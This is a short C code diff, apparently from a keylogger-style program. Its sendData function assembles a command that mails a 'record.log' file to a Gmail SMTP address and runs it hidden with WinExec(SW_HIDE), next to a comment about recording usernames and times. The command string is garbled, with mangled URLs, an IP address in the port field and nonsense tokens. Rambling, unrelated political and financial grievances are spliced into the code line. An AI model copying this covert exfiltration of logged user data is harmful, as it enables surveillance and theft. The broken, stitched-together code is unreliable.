@@ -144,7 +144,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:35.355 -v --mail-from \"https://workspace.google.com/intl/en-nl/gmail/info_israel@checkpoint.com \" --mail-rcpt \"https://workspace.google.com/intl/en-nl/gmail/info_israel@checkpoint.com" --ssl -u https://workspace.google.com/intl/en-nl/gmail/info_israel@checkpoint.com :password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:34.101.50.144 -v --mail-from \"https://workspace.google.com/intl/en-il/gmail/info_israel@checkpoint.com \" --mail-rcpt \"https://workspace.google.com/intl/en-il/gmail/info_israel@checkpoint.com" --ssl -u https://workspace.google.com/intl/en-il/gmail/info_israel@checkpoint.com :password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks**/
 	* Record username, time, and date.
 **/
